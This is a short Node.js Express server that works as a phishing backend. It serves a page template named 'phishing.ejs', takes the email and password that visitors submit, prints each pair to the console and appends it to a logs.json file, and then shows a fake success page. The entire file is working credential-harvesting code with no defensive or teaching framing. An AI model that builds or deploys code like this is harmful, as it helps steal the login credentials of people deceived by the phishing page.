const express = require('express');
const app = express();
const bodyParser = require("body-parser");
const fs = require("fs");

app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
    res.render("phishing.ejs");
});

app.post("/", (req, res) => {
    let email = req.body.usermail;
    let pass = req.body.userpass;
    email = JSON.stringify(email, null, 2);
    pass = JSON.stringify(pass, null, 2);
    console.log(`${email} -> ${pass}`);
    
    const logData = `${email} -> ${pass}\n`;
    fs.appendFile('logs.json', logData, (err) => {
        if (err) {
            console.error(err);
        }
    });

    res.render("success.ejs");
});

app.listen(3000, () => {
    console.log("Server is running on port 3000");
});